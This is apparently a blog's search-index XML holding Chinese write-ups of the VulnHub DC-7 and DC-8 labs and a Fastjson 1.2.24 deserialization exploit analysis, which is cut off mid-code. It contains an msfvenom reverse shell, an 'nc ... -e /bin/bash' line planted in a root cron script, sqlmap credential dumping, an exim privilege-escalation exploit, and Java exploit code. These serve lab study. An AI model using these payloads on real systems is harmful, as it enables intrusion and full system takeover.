<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>VulnHub - DC:7</title>
      <link href="/2023/03/09/penetrationstest/ba-chang-xue-xi/vulnhub/dc-xi-lie/vulnhub-dc-7/"/>
      <url>/2023/03/09/penetrationstest/ba-chang-xue-xi/vulnhub/dc-xi-lie/vulnhub-dc-7/</url>
      
        <content type="html"><![CDATA[<h1 id="VulnHub-DC-7"><a href="#VulnHub-DC-7" class="headerlink" title="VulnHub - DC_7"></a>VulnHub - DC_7</h1><p>#Drupal后台Getshell #定时任务提权</p><h2 id="1-环境搭建"><a href="#1-环境搭建" class="headerlink" title="1. 环境搭建"></a>1. 环境搭建</h2><ul><li><p>靶场地址：[VulnHub 链接](<a href="https://www.vulnhub.com/entry/dc-7,356/">DC: 7 ~ VulnHub</a>)</p></li><li><p>难度：简单</p></li><li><p>靶机目标：获取 1 个flag</p></li></ul><h2 id="2-信息收集"><a href="#2-信息收集" class="headerlink" title="2. 信息收集"></a>2. 信息收集</h2><h3 id="2-1-主机发现"><a href="#2-1-主机发现" class="headerlink" title="2.1 主机发现"></a>2.1 主机发现</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> nmap <span class="token parameter variable">-sP</span> <span class="token number">192.168</span>.1.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../../pic/Pasted%20image%2020230309002214.png"></p><p>这次靶机的位置为 192.168.1.105</p><h3 id="2-2-端口扫描"><a href="#2-2-端口扫描" class="headerlink" title="2.2 端口扫描"></a>2.2 端口扫描</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> nmap <span class="token parameter variable">-sS</span> <span class="token parameter variable">-sV</span> <span class="token parameter variable">-sC</span> -p- <span class="token parameter variable">-T4</span> <span class="token number">192.168</span>.1.105<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../../pic/Pasted%20image%2020230309002644.png"></p><p>扫描出来开放了 22 以及 80 端口，其中还通过 robots.txt 读取到了一些路径地址</p><h2 id="3-WEB-渗透"><a href="#3-WEB-渗透" class="headerlink" title="3. WEB 渗透"></a>3. WEB 渗透</h2><p>访问 <a href="http://192.168.1.105/">http://192.168.1.105/</a> </p><p><img src="/../../../../../pic/Pasted%20image%2020230309002740.png"></p><p>没给啥特别有用的东西</p><p>探测下使用到的技术</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">whatweb http://192.168.0.106/ <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../../pic/Pasted%20image%2020230309002804.png"></p><p>使用 Drupal 8 搭建</p><p>找了一下 Exp 一个都不能用，查看下别人的 WP 才知道要去 Twitter 上去找？</p><p><img src="/../../../../../pic/Pasted%20image%2020230309002836.png"></p><p>去 Twitter 上查一下</p><p><img src="/../../../../../pic/Pasted%20image%2020230308233735.png"></p><p>给了一个 github 的链接</p><p>访问之后只有一个仓库，并且在 ReadMe 中有提示</p><p><img src="/../../../../../pic/Pasted%20image%2020230308233519.png"></p><p>clone 下来审计一波</p><pre class="line-numbers language-none"><code class="language-none">git clone https://github.com/Dc7User/staffdb.git<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在 config.php 下找到一个账户</p><p><img src="/../../../../../pic/image-20230212191341324.png"></p><p>目前可知可以用于登录的有后台以及 SSH</p><p>测试后台登录</p><p><img src="/../../../../../pic/Pasted%20image%2020230309003043.png"></p><p>题目用户名或密码错误，拿着尝试去登录 SSH</p><p>使用 dc7user / MdR3xOgB7#dW 登录 SSH</p><p><img src="/../../../../../pic/Pasted%20image%2020230309003154.png"></p><p>成功登录进后台</p><p>继续拿上面泄露出来的账户登录下数据库</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">mysql -udc7user -pMdR3xOgB7#dW<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../../pic/Pasted%20image%2020230309003240.png"></p><p>连接失败，被拒绝使用当前用户登录。</p><p>看一下网站配置文件中是否保存着连接账户</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">cat /var/www/html/sites/default/settings.php <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../../pic/Pasted%20image%2020230309004010%201.png"></p><p>找到了一个账户 db7user / yNv3Po00</p><p>连接数据库</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">mysql -udb7user -pyNv3Po00<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>读取了一下数据库获取用户信息</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> uid<span class="token punctuation">,</span>name<span class="token punctuation">,</span>pass <span class="token keyword">from</span> users_field_data<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../../pic/Pasted%20image%2020230309004446.png"></p><p>用户密码被加密存储</p><p>找到了一个论坛上提出的方法 <a href="https://www.drupal.org/node/992400#comment-4673708">Reset admin password in drupal 7 | Drupal.org</a></p><p><img src="/../../../../../pic/Pasted%20image%2020230309005850.png"></p><pre class="line-numbers language-text" data-language="text"><code class="language-text">cd /var/www/htmldrush upwd admin --password="password"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/../../../../../pic/Pasted%20image%2020230309005946.png"></p><p>提示修改成功，然后使用 admin / password 成功登入后台</p><p><img src="/../../../../../pic/Pasted%20image%2020230309010015.png"></p><p>找了一下并没有发现什么 flag 的痕迹，再回到 SSH 看一下</p><p><img src="/../../../../../pic/Pasted%20image%2020230309010105.png"></p><p>在用户目录下还存着两个文件</p><p>读取下 mbox 内容</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">cat mbox <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../../pic/Pasted%20image%2020230309010327.png"></p><p>内容似乎是 root 用户执行了一个备份脚本然后将运行结果发送过来</p><p>读取下 mail </p><pre class="line-numbers language-text" data-language="text"><code class="language-text">cat /var/mail/dc7user<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../../pic/Pasted%20image%2020230309014518.png"></p><p>发现该脚本每 15 分钟自动执行一次</p><p>也就是如果可以控制脚本内容，即可以在自动执行时通过反弹 shell 获得 root 用户权限</p><p>查看一下该脚本权限</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">ls -la /opt/scripts/backups.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../../pic/Pasted%20image%2020230309010723.png"></p><p>该文件属于 root 用户，www-data 组的用户可以修改其内容</p><p>显然当前获取到的用户无法对其进行修改</p><p>读取下内容</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">cat /opt/scripts/backups.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../../pic/Pasted%20image%2020230309010436.png"></p><p>没啥特别的内容，就是执行下备份操作</p><p>下一步的目标为获取 www-data 用户权限用于修改该脚本内容</p><h2 id="4-权限提升"><a href="#4-权限提升" class="headerlink" title="4. 权限提升"></a>4. 权限提升</h2><p>回到刚才登录进的后台</p><p>在文章管理处可以新建文章</p><p><img src="/../../../../../pic/Pasted%20image%2020230309011947.png"></p><p>可以自定义文章的格式，但是没有 PHP 格式</p><p>Drupal 可以通过安装扩展的方式来支持 PHP 格式的文章</p><p>这里使用到的扩展的地址为</p><pre class="line-numbers language-none"><code class="language-none">https://ftp.drupal.org/files/projects/php-8.x-1.x-dev.tar.gz<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在 Extend 模块下安装一个扩展</p><p><img src="/../../../../../pic/Pasted%20image%2020230309012229.png"></p><p>由于网络原因我这边先将扩展下载到本地然后上传进行安装</p><p><img src="/../../../../../pic/Pasted%20image%2020230309012411.png"></p><p>安装成功</p><p><img src="/../../../../../pic/Pasted%20image%2020230309012534.png"></p><p>将扩展启用</p><p><img src="/../../../../../pic/Pasted%20image%2020230309012554.png"></p><p>此时回到先前的文章发布功能中</p><p><img src="/../../../../../pic/Pasted%20image%2020230309012625.png"></p><p>可以看到支持了 php 语言</p><p>在 Body 中写入一句话木马或者反弹一个 shell</p><p>msfvenom 生成一个 PHP 反弹 shell</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">msfvenom -p php/reverse_php LHOST=192.168.1.103 LPORT=10010 -f raw &gt; shell.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../../pic/Pasted%20image%2020230309013340.png"></p><p>将获取到的内容填入 Body</p><p><img src="/../../../../../pic/Pasted%20image%2020230309013408.png"></p><p>保存文件之后访问</p><p><img src="/../../../../../pic/Pasted%20image%2020230309013456.png"></p><p>接收到反弹 Shell</p><p>获取到了 www-data 用户权限</p><p>接下来可以修改 /opt/scripts/backups.sh 文件内容向其中写入反弹 shell</p><pre class="line-numbers language-tet" data-language="tet"><code class="language-tet">ls /bin | grep nc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../../pic/Pasted%20image%2020230309014013.png"></p><p>这里找到服务器上有 nc，直接用 nc 反弹 shell</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">echo "nc 192.168.1.103 10011 -e /bin/bash" &gt; /opt/scripts/backups.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../../pic/Pasted%20image%2020230309014315.png"></p><p>成功写入 shell，然后等待脚本自动执行即可</p><p><img src="/../../../../../pic/Pasted%20image%2020230309014828.png"></p><p>获得了 root 用户权限</p><h2 id="5-获取-flag"><a href="#5-获取-flag" class="headerlink" title="5. 获取 flag"></a>5. 获取 flag</h2><p>读取下 flag</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">cat /root/theflag.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../../pic/Pasted%20image%2020230309015044.png"></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> VulnHub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VulnHub - DC_8</title>
      <link href="/2023/02/12/penetrationstest/ba-chang-xue-xi/vulnhub/dc-xi-lie/vulnhub-dc-8/"/>
      <url>/2023/02/12/penetrationstest/ba-chang-xue-xi/vulnhub/dc-xi-lie/vulnhub-dc-8/</url>
      
        <content type="html"><![CDATA[<h1 id="VulnHub-DC-8"><a href="#VulnHub-DC-8" class="headerlink" title="VulnHub - DC_8"></a>VulnHub - DC_8</h1><p>#exim4提权</p><h2 id="1-环境搭建"><a href="#1-环境搭建" class="headerlink" title="1. 环境搭建"></a>1. 环境搭建</h2><ul><li><p>靶场地址：<a href="https://www.vulnhub.com/entry/dc-8,367/">VulnHub 链接</a></p></li><li><p>难度：简单</p></li><li><p>靶机目标：获取 1 个flag</p></li></ul><h2 id="2-信息收集"><a href="#2-信息收集" class="headerlink" title="2. 信息收集"></a>2. 信息收集</h2><h3 id="2-1-主机发现"><a href="#2-1-主机发现" class="headerlink" title="2.1 主机发现"></a>2.1 主机发现</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sP</span> <span class="token number">192.168</span>.0.1/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../../pic/Pasted%20image%2020230214000247.png"></p><p>在 192.168.0.101 </p><h3 id="2-2-端口扫描"><a href="#2-2-端口扫描" class="headerlink" title="2.2 端口扫描"></a>2.2 端口扫描</h3><p>探测下开放端口</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sS</span> <span class="token parameter variable">-sV</span> <span class="token parameter variable">-sC</span> -p- <span class="token parameter variable">-T4</span> <span class="token number">192.168</span>.0.101<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../../pic/Pasted%20image%2020230214000704.png"></p><p>开放了 80 与 22 端口</p><h2 id="3-Web-渗透"><a href="#3-Web-渗透" class="headerlink" title="3. Web 渗透"></a>3. Web 渗透</h2><p>访问 <a href="http://192.168.0.101/">http://192.168.0.101</a> </p><p><img src="/../../../../../pic/Pasted%20image%2020230214000922.png"></p><p>又是个使用 Drupal 搭建的站点</p><p>点击左侧的 Details，在参数 nid 处存在 SQL 注入</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap <span class="token parameter variable">-u</span> <span class="token string">"http://192.168.0.101/?nid=1"</span> <span class="token parameter variable">-p</span> <span class="token string">"nid"</span> <span class="token parameter variable">-D</span> d7db <span class="token parameter variable">-T</span> <span class="token function">users</span> <span class="token parameter variable">-C</span> name,pass <span class="token parameter variable">--dump</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>获得用户名以及密码密文</p><p><img src="/../../../../../pic/Pasted%20image%2020230214001235.png"></p><p>将密文写入 pass.txt 使用 john 进行爆破</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">john pass.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../../pic/Pasted%20image%2020230214001945.png"></p><p>使用 john / turtel 访问 <a href="http://192.168.0.101/user/login">http://192.168.0.101/user/login</a> 登录进后台</p><p>和 DC 7 一样在文章处使用 PHP 模式写入马</p><p><img src="/../../../../../pic/Pasted%20image%2020230214002615.png"></p><p>然后随便输入点内容提交后即可获得 shell</p><p><img src="/../../../../../pic/Pasted%20image%2020230214003548.png"></p><h2 id="4-系统提权"><a href="#4-系统提权" class="headerlink" title="4. 系统提权"></a>4. 系统提权</h2><p>查看下 SUID 权限</p><p><img src="/../../../../../pic/Pasted%20image%2020230214005044.png"></p><p>exim4 提供邮件服务</p><p>查看下当前 exim4 版本</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">exim4 <span class="token parameter variable">--version</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../../pic/Pasted%20image%2020230214005332.png"></p><p>查找下是否存在漏洞</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">searchsploit exim<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../../pic/Pasted%20image%2020230214005517.png"></p><p>上传到目标服务器</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./46996.sh <span class="token parameter variable">-m</span> netcat<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../../pic/Pasted%20image%2020230214011100.png"></p><p>成功提权</p><p>读取 flag</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> /root/flag.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../../pic/Pasted%20image%2020230214011151.png"></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> VulnHub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java 反序列化 Fastjson 篇 1.2.24 版本漏洞分析</title>
      <link href="/2023/02/07/skilllearning/java-an-quan/java-fan-xu-lie-hua/fastjson-pian/java-fan-xu-lie-hua-fastjson-pian-1-2-24-ban-ben-lou-dong-fen-xi/"/>
      <url>/2023/02/07/skilllearning/java-an-quan/java-fan-xu-lie-hua/fastjson-pian/java-fan-xu-lie-hua-fastjson-pian-1-2-24-ban-ben-lou-dong-fen-xi/</url>
      
        <content type="html"><![CDATA[<h1 id="Java-反序列化-Fastjson-篇-1-2-24-版本漏洞分析"><a href="#Java-反序列化-Fastjson-篇-1-2-24-版本漏洞分析" class="headerlink" title="Java 反序列化 Fastjson 篇 1.2.24 版本漏洞分析"></a>Java 反序列化 Fastjson 篇 1.2.24 版本漏洞分析</h1><h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h2><ul><li>影响版本：Fastjson 1.2.22 - 1.2.24 版本</li><li>攻击思路：<ul><li>TemplateImpl</li><li>JNDI 注入</li></ul></li></ul><h2 id="2-环境搭建"><a href="#2-环境搭建" class="headerlink" title="2. 环境搭建"></a>2. 环境搭建</h2><ul><li>java 8u65</li><li>Fastjson 1.2.24</li></ul><p>导入包</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>com.unboundid<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>unboundid-ldapsdk<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>4.0.9<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>commons-io<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>commons-io<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>2.5<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>com.alibaba<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>fastjson<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>1.2.24<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>commons-codec<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>commons-codec<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>1.12<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3-TemplatesImpl"><a href="#3-TemplatesImpl" class="headerlink" title="3. TemplatesImpl"></a>3. TemplatesImpl</h2><h3 id="3-1-链子分析"><a href="#3-1-链子分析" class="headerlink" title="3.1 链子分析"></a>3.1 链子分析</h3><p>在 CC3 中引入了 TemplatesImpl，现在再回去重温一下</p><p><img src="/../../../../../pic/image-20230208013845358.png"></p><p>最终目标还是 defineTransletClasses()，getTransletInstance() 属于 getter ，但是由于返回值不符合返回值类型继承自Collection或Map或AtomicBoolean或AtomicInteger或AtomicLong 因而不能在 Fastjson 反序列化时被调用，于是还要去寻找哪里调用了该函数</p><p>最后找到了 TemplatesImpl.getOutputProperties()</p><p><img src="/../../../../../pic/image-20230208015337823.png"></p><p>这里的返回值类型为 Properties，而 Properties 继承了 Hashtable，Hashtable 又实现了 Map 接口，所以可以利用该方法</p><h3 id="3-2-EXP-编写"><a href="#3-2-EXP-编写" class="headerlink" title="3.2 EXP 编写"></a>3.2 EXP 编写</h3><p>先生成一个恶意类</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">org<span class="token punctuation">.</span>example</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span></span><span class="token class-name">DOM</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span></span><span class="token class-name">TransletException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>runtime<span class="token punctuation">.</span></span><span class="token class-name">AbstractTranslet</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>dtm<span class="token punctuation">.</span></span><span class="token class-name">DTMAxisIterator</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>serializer<span class="token punctuation">.</span></span><span class="token class-name">SerializationHandler</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Calc</span> <span class="token keyword">extends</span> <span class="token class-name">AbstractTranslet</span> <span class="token punctuation">{</span>    <span class="token comment">// 写入静态构造方法，在加载时就会调用</span>    <span class="token keyword">static</span> <span class="token punctuation">{</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">transform</span><span class="token punctuation">(</span><span class="token class-name">DOM</span> document<span class="token punctuation">,</span> <span class="token class-name">SerializationHandler</span><span class="token punctuation">[</span><span class="token punctuation">]</span> handlers<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">TransletException</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">transform</span><span class="token punctuation">(</span><span class="token class-name">DOM</span> document<span class="token punctuation">,</span> <span class="token class-name">DTMAxisIterator</span> iterator<span class="token punctuation">,</span> <span class="token class-name">SerializationHandler</span> handler<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">TransletException</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>编译为 class 放着</p><p>然后编写 Fastjson 反序列化</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">org<span class="token punctuation">.</span>example</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span></span><span class="token class-name">JSON</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">.</span></span><span class="token class-name">Feature</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">.</span></span><span class="token class-name">ParserConfig</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>codec<span class="token punctuation">.</span>binary<span class="token punctuation">.</span></span><span class="token class-name">Base64</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOUtils</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ByteArrayOutputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">File</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">FileInputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Exploit</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">readClass</span><span class="token punctuation">(</span><span class="token class-name">String</span> cls<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">ByteArrayOutputStream</span> bos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            <span class="token class-name">IOUtils</span><span class="token punctuation">.</span><span class="token function">copy</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span>cls<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> bos<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">encodeBase64String</span><span class="token punctuation">(</span>bos<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token 